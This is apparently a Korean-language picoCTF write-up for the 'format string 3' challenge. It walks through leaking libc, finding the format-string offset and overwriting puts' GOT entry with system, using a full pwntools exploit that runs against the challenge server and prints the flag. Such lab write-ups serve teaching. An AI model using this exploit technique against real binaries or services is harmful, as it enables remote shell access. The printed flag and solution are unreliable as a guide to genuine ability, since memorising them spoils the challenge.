# [format string 3](https://play.picoctf.org/practice/challenge/449?category=6&originalEvent=73&page=1)
<br />

**Description**
> This program doesn't contain a win function. How can you win?
<br />

**Source Code:**
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}
```
<br />

**Binary Protections:**
```yaml
format-string-3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter./ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, BuildID[sha1]=54e1c4048a725df868e9a10dc975a46e8d8e5e92, not stripped

[*] '/home/kali/pico/format_string_3/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

# 1. `system` 주소 구하기
소스코드 중 `printf(buf)`는 FSB 취약점을 발생시킵니다. 이 취약점으로 내부 주소 유출 및 특정 주소 값 조작 등을 할 수 있습니다. 본 문제는 `puts`의 GOT를 `system`의 주소로 조작하여 쉘을 따내는 문제입니다. 이를 하기에 앞서 문제에서 제공되는 `setvbuf`로 라이브러리 베이스, `system` 주소를 구하겠습니다.
```bash
$ readelf -s libc.so.6 | grep "setvbuf"
  1300: 000000000007a3f0   608 FUNC    WEAK   DEFAULT   16 setvbuf@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep "system"
  1511: 000000000004f760    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
```
위 오프셋을 가지고 `libc_base`, `system` 주소를 계산할 수 있습니다.

```python
from pwn import *

p = process("./format-string-3")

p.recvuntil(b"0x")

libc_base = int(p.recv(14), 16) - 0x7a3f0
libc_system = libc_base + 0x4f760
log.info(f"libc_base: {libc_base: #x}")
log.info(f"libc_system: {libc_system: #x}")

p.interactive()
```
```bash
$ python3 test.py
[+] Starting local process '/home/kali/pico/format_string_3/format-string-3': pid 1111
[*] libc_base:  0x7f255443a000
[*] libc_system:  0x7f2554489760
[*] Switching to interactive mode
$
```
<br />

# 2. 메모리 유출로 오프셋 구하기
GOT를 조작하기 위해서는 입력 받아 저장하는 버퍼의 시작 위치를 알아야합니다. 아래 과정으로 구할 수 있습니다.
```bash
$ ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7fad387c23f0
AAAAAAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
AAAAAAAA0x7fad38920963|0xfbad208b|0x7fffc740cbb0|0x1|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x4141414141414141
/bin/sh
```
`AAAAAAAA`의 오프셋은 파이썬으로 자동화하여 다음과 같이 구할 수 있습니다.
```python
data = ("AAAAAAAA0x7fad38920963|0xfbad208b|0x7fffc740cbb0|0x1|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x4141414141414141")
data = data.split("|")

target = "0x4141414141414141"

if target in data:
    idx = data.index(target)
    print(f"offset: {idx+1}")
```
```bash
$ python3 test.py
offset: 38
```
<br />

# 3. GOT 덮어쓰기
```yaml
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/kali/pico/format_string_3/format-string-3:
GOT protection: Partial RELRO | Found 4 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
...
```
pwndbg로 확인할 결과 `puts`의 GOT 주소는 `0x404018`입니다. 위 정보를 가지고 공격 코드를 작성할 수 있습니다.

```python
from pwn import *

context.arch = "amd64"

# p = process("./format-string-3")
p = remote("rhea.picoctf.net", 51563)

p.recvuntil(b"0x")

libc_base = int(p.recv(14), 16) - 0x7a3f0
libc_system = libc_base + 0x4f760
log.info(f"libc_base: {libc_base: #x}")
log.info(f"libc_system: {libc_system: #x}")

pay = fmtstr_payload(38, {0x404018:libc_system})

p.send(pay)
p.interactive()
```
```bash
$ python3 test.py
[+] Opening connection to rhea.picoctf.net on port 51563: Done
[*] libc_base:  0x7a9afecb0000
[*] libc_system:  0x7a9afecff760
[*] Switching to interactive mode
$
                                                                                               c                         \x8b                                                                                    \x01                                       \x00      \x00aaaabaa\x18@@$
$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_7a2369d3}$
```
